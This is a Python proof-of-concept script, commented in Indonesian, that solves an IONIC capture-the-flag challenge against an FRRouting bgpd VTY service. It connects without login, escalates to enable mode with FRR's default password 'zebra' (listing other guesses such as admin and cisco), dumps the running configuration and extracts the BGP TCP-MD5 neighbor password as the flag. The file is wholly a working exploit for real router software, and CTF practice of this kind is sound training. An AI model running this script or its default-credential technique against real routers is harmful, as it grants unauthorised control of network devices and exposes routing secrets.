#!/usr/bin/env python3
"""
auth.poc.py — "The Open Router" (IONIC CTF) — Proof of Concept

Bug  : FRR bgpd VTY diekspos langsung ke internet, `line vty` pakai `no login`,
       dan password `enable` masih default FRR ("zebra").
Exploit:
    1. connect ke VTY (langsung dapat prompt view mode, tanpa login)
    2. `enable` + password default "zebra"  ->  prompt jadi openrouter#
    3. `show running-config` -> neighbor TCP-MD5 key = flag

Usage:
    python3 auth.poc.py                            # chall.ctf.tccpens.id:30918
    python3 auth.poc.py <host> <port>
"""

import re
import socket
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "chall.ctf.tccpens.id"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 30918

ENABLE_PW = "zebra"        # default FRR/Quagga
TRANSCRIPT = "poc_output.txt"

C = {"c": "\033[36m", "g": "\033[32m", "r": "\033[31m", "y": "\033[33m", "0": "\033[0m"}


class Vty:
    """FRR VTY client minimal: kirim CRLF, baca sampai prompt/quiet."""

    def __init__(self, host, port):
        self.log = []
        self.s = socket.create_connection((host, port), timeout=10)
        self.s.settimeout(1.5)
        self.buf = ""
        self.read()

    def read(self, idle=1.2, total=15):
        """Baca sampai stream diam `idle` detik."""
        self.s.settimeout(idle)
        end = time.time() + total
        out = ""
        while time.time() < end:
            try:
                d = self.s.recv(65535)
            except socket.timeout:
                break
            if not d:
                self.log.append(out)
                raise EOFError("server menutup koneksi (instance expired?)")
            out += d.decode(errors="replace")
        self.buf += out
        self.log.append(out)
        return out

    def wait_for(self, pattern, timeout=8):
        """Baca sampai regex `pattern` muncul (mis. prompt)."""
        self.s.settimeout(timeout)
        end = time.time() + timeout
        out = ""
        while time.time() < end and not re.search(pattern, out):
            try:
                d = self.s.recv(65535)
            except socket.timeout:
                break
            if not d:
                self.log.append(out)
                raise EOFError("server menutup koneksi (instance expired?)")
            out += d.decode(errors="replace")
        self.buf += out
        self.log.append(out)
        return out

    def send(self, line):
        self.s.sendall(line.encode() + b"\r\n")
        time.sleep(0.2)

    def cmd(self, line, idle=1.2):
        print(f"{C['c']}{line}{C['0']}")
        self.send(line)
        txt = self.read(idle)
        print(txt.replace("\r\n", "\n").rstrip())
        return txt

    def save(self, path=TRANSCRIPT):
        with open(path, "w", encoding="utf-8") as f:
            f.write("".join(self.log))
        return path


def main():
    print(f"{C['y']}[*] target : {HOST}:{PORT}{C['0']}")
    try:
        v = Vty(HOST, PORT)
    except Exception as e:
        print(f"{C['r']}[-] connect gagal: {e}{C['0']}")
        print("    -> instance mungkin sudah expired, klik Extend/Restart di dashboard")
        return 1

    # ---------- 1. fingerprint ----------
    print(f"\n{C['y']}[1] fingerprint service{C['0']}")
    ver = v.cmd("show version")
    m = re.search(r"FRRouting\s+(\S+)", ver)
    print(f"{C['g']}[+] FRRouting {m.group(1) if m else '?'} — bgpd VTY langsung (bukan vtysh){C['0']}\n")

    # ---------- 2. bukti TCP-MD5 di neighbor ----------
    print(f"{C['y']}[2] cek neighbor BGP{C['0']}")
    nb = v.cmd("show ip bgp neighbors 192.168.100.2")
    if "Peer Authentication Enabled" in nb:
        print(f"{C['g']}[+] neighbor pakai TCP-MD5 => ada secret BGP di config{C['0']}\n")

    # ---------- 3. enable dengan password default ----------
    print(f"{C['y']}[3] privilege escalation: enable + password {ENABLE_PW!r}{C['0']}")
    v.send("enable")
    pr = v.wait_for(r"(Password:|#)")
    if "Password" in pr:
        print("Password: ", end="", flush=True)
        v.send(ENABLE_PW)
        pr = v.wait_for(r"(Password:|#)")
        print("\n" + pr.replace("\r\n", "\n").rstrip())
    if "#" not in v.buf:
        print(f"{C['r']}[-] enable gagal. coba password lain: admin / frr / cisco / openrouter{C['0']}")
        v.save()
        return 1
    print(f"{C['g']}[+] enable mode: openrouter#{C['0']}\n")

    # ---------- 4. dump config ----------
    print(f"{C['y']}[4] show running-config{C['0']}")
    cfg = v.cmd("show running-config", idle=1.5)

    # ---------- 5. ambil flag ----------
    flag = re.search(r"password\s+(IONIC\{[^}]+\})", cfg)
    path = v.save()
    v.s.close()

    print()
    if flag:
        print(f"{C['g']}{'=' * 62}")
        print("[+] SECRET BGP / TCP-MD5 neighbor password:")
        print(f"    {flag.group(1)}")
        print(f"{'=' * 62}{C['0']}")
        print(f"[*] transcript tersimpan: {path}  (pakai ini buat screenshot)")
        return 0
    print(f"{C['r']}[-] flag tidak ketemu di output, cek {path}{C['0']}")
    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except EOFError as e:
        print(f"{C['r']}[-] {e}{C['0']}")
        sys.exit(2)
